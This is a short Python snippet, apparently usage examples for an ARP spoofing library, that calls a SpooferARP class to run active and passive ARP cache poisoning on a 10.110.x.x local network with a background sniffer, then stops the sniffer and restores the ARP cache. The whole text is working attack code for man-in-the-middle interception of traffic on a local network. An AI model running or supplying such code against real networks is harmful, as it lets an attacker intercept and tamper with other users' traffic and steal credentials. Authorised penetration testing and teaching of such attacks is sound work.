from ArpSpoof import SpooferARP

spoofer = SpooferARP('10.110.0.1', '10.110.255.255')
spoofer.active_cache_poisonning()

spoofer = SpooferARP('10.110.0.1', '10.110.255.255', conf.iface, False, 0.5)
spoofer.passive_cache_poisonning(asynchronous=True)
spoofer.run = False
spoofer.sniffer.stop()                                   # only with asynchronous mode
spoofer.restore()                                        # only with asynchronous mode
